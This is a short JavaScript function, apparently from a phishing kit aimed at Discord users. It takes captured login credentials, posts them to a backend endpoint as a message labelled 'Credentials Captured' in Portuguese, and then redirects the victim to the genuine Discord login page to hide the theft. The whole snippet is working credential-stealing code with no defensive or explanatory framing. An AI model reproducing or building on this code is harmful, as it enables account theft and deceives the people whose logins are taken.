async function enviarDados(credenciais) {
    await fetch('/api/send', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            content: `🔥 **[PEAK LOGS] Credenciais Capturadas!**\n\`\`\`json\n${JSON.stringify(credenciais, null, 2)}\n\`\`\``
        })
    });

    window.location.href = 'https://discord.com/login';
}
